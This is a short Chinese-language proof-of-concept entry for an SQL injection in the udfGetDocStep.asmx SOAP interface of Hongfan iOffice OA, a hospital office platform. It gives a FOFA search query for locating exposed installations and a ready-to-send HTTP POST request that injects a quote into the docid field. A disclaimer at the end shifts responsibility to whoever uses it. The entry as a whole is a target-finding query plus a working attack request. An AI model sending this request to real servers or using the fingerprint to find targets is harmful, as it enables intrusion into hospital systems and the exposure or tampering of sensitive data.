# udfGetDocStep_sql
>   红帆OA是红帆科技基于微软.NET最新技术开发的信息管理平台，红帆oa系统为医院提供oA功能，完成信息发布、流程审批、公文管理、日程管理、工作安排、文件传递、在线沟通等行政办公业务。

## 网络指纹

**fofa：**app="红帆-ioffice"

## 简介

红帆iOffice udfGetDocStep.asmx接口处存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

## 漏洞类型

SQL注入

## 影响范围

-   红帆OA

## POC

```http
POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetDocStep"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
    <GetDocStep xmlns="http://tempuri.org/">
        <docid>1'</docid>
    </GetDocStep>
    </soap:Body>
</soap:Envelope>  
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
